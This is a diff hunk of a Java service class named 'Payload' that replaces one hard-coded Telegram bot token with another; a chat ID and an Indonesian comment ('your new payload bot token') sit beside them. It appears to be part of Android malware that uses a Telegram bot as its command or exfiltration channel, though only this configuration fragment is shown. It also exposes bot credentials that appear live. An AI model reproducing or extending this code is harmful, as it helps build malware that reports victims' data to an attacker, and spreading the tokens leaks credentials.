@@ -34,8 +34,8 @@ import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
-    // ── TOKEN BOT PAYLOAD BARU KAMU ──
-    private String BOT_TOKEN = "9163541732:AAFz_ibQ0T0hC_4tR81RzuKgF8bcx3-TyqQ"; 
+    // ── TOKEN BOT PAYLOAD BARU ──
+    private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
     private String CHAT_ID = "8598136412";
     
     private volatile boolean isRunning = true;
